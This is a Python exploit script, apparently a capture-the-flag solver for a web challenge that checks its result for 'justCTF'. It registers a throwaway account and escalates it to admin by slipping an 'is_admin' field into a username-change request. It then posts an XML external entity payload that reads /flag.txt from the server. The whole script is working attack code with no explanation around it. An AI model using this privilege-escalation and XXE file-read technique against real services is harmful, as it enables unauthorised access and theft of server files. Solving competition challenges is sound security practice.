#! /usr/bin/env python3

import requests
import sys
from urllib.parse import urljoin
import string
import random

host = sys.argv[1]
port = int(sys.argv[2])

print("HOST=", host, "PORT=", port)

if not host.startswith('http://'):
	host = 'http://' + host

username = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
email = username + "@asdf.com"
password = "password123"

creat = {
  "username": username,
  "email": email,
  "password":  password
}

print('[*] creating user')

r = requests.post(urljoin(host, '/register') , json=creat)

print(f"status: {r.status_code}")

if r.status_code != 200:
	print("in register")
	exit(-1)

login = {
  "username": username,
  "password": password
}

r = requests.post(urljoin(host, '/login') , json=login)

if r.status_code != 200:
	print("in login")
	exit(-1)

token = r.json()['Token']

print(token)

chg_uname = {
	"username": username,
	"is_admin": 1
}

r = requests.put(urljoin(host, '/change_username'), json=chg_uname, headers={"Authorization": f"Bearer {token}"})

if r.status_code != 200:
	print("in change_username")
	exit(-1)


login = {
  "username": username,
  "password": password
}

r = requests.post(urljoin(host, '/login') , json=login)

if r.status_code != 200:
	print("in login")
	exit(-1)

token = r.json()['Token']
print(token)

solve = {
  "xml_data": "<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM  \"file:///flag.txt\" >]><foo>&xxe;</foo>"
}

r = requests.post(urljoin(host, '/personel/0') , json=solve, headers={"Authorization": f"Bearer {token}"})

print(r.status_code)

if r.status_code != 200:
	print("in solve")
	exit(-1)

print(r.content)

if 'justCTF' in r.content.decode('utf-8'):
	print('got flag!')

	exit(0)

exit(-1)
